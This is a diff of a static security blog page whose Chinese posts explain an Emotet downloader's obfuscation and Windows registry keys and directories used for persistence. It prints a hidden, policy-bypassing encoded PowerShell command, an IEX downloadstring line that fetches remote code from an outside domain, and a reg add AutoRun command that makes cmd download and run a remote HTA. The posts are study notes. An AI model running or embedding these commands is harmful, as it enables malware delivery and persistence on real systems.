@@ -756,7 +756,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2023-08-29 15:19:49 / Modified: 10:14:27" itemprop="dateCreated datePublished" datetime="2023-08-29T15:19:49+08:00">2023-08-29</time>
+              <time title="Created: 2023-08-29 15:19:49 / Modified: 10:14:28" itemprop="dateCreated datePublished" datetime="2023-08-29T15:19:49+08:00">2023-08-29</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -779,13 +779,85 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Emptet下载器"><a href="#Emptet下载器" class="headerlink" title="Emptet下载器"></a>Emptet下载器</h2><p>技术特点：利用大小写，空格加base64绕过特征检测。</p>
+          <h2 id="Emptet下载器"><a href="#Emptet下载器" class="headerlink" title="Emptet下载器"></a>Emptet下载器</h2><p>技术特点：利用大小写，空格加base64绕过特征检测。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c powErshEll -nop -w hiddEn -Ep bypass -Enc &#123;base64_encoded_string&#125;</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I E X   ( N e w - O b j e c t   N e t . W e b c l i e n t ) . d o w n l o a d s t r i n g ( &quot; h t t p : / / e d u c a t i o l i n k . c o m / i n d e x . p h p &quot; ) </span><br></pre></td></tr></table></figure>
 <p> 基础知识：</p>
 <p> <code>-nop</code>：这是 <code>-NoProfile</code> 的简写，启动 PowerShell 时不加载用户的个人档案。 </p>
 <p> -w hiddEn 用于指定 PowerShell 窗口的显示样式。 </p>
 <p> <code>bypass</code> 设置表示没有任何限制：脚本可以运行，配置文件可以加载。 </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/Windows02/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/CTF/Windows02/" class="post-title-link" itemprop="url">注册表项</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-08-29 14:19:49 / Modified: 11:14:08" itemprop="dateCreated datePublished" datetime="2023-08-29T14:19:49+08:00">2023-08-29</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>本文记录那些可以被用来权限维持以及信息探测的注册表项。</p>
+<h2 id="启动进程"><a href="#启动进程" class="headerlink" title="启动进程"></a>启动进程</h2><p><code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</code> </p>
+<p>用于指定那些只需要在下次系统启动时运行一次的程序或命令。与此位置相关的命令或程序在执行完一次后通常会从此列表中自动删除。 </p>
+<h2 id="下载并执行"><a href="#下载并执行" class="headerlink" title="下载并执行"></a>下载并执行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add &#x27;HKCU\Software\Microsoft\Command Processor&#x27; </span><br><span class="line">/v AutoRun /t REG_SZ /d &#x27;mshta.exe&#x27; http:/exam/1.hta /f</span><br></pre></td></tr></table></figure>
+<p> 通过注册表设置命令行默认启动项，当目标启动cmd时，便会下载并执行远程hta文件。 </p>
 
       
     </div>
@@ -836,7 +908,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-08-30 12:45:23" itemprop="dateModified" datetime="2023-08-30T12:45:23+08:00">2023-08-30</time>
+                <time title="Modified: 2023-08-30 12:45:24" itemprop="dateModified" datetime="2023-08-30T12:45:24+08:00">2023-08-30</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -859,84 +931,12 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本文记录那些windows中的敏感目录和信息。</p>
+          <p>本文记录那些windows中的敏感目录和信息。</p>
 <p>最近访问的文件、关键文件目录、操作系统配置、进程列表和常见目录等系统信息 </p>
 <h2 id="利用目录"><a href="#利用目录" class="headerlink" title="利用目录"></a>利用目录</h2><p>开机启动项目</p>
 <p>%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p>
 <p> <strong>%TEMP%/</strong></p>
 <p><strong>%RARTMPDIR%</strong> </p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/Windows02/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/CTF/Windows02/" class="post-title-link" itemprop="url">注册表项</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-08-29 14:19:49 / Modified: 11:14:06" itemprop="dateCreated datePublished" datetime="2023-08-29T14:19:49+08:00">2023-08-29</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本文记录那些可以被用来权限维持以及信息探测的注册表项。</p>
-<h2 id="启动进程"><a href="#启动进程" class="headerlink" title="启动进程"></a>启动进程</h2><p><code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</code> </p>
-<p>用于指定那些只需要在下次系统启动时运行一次的程序或命令。与此位置相关的命令或程序在执行完一次后通常会从此列表中自动删除。 </p>
-<h2 id="下载并执行"><a href="#下载并执行" class="headerlink" title="下载并执行"></a>下载并执行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add &#x27;HKCU\Software\Microsoft\Command Processor&#x27; </span><br><span class="line">/v AutoRun /t REG_SZ /d &#x27;mshta.exe&#x27; http:/exam/1.hta /f</span><br></pre></td></tr></table></figure>
-<p> 通过注册表设置命令行默认启动项，当目标启动cmd时，便会下载并执行远程hta文件。 </p>
 
       
     </div>
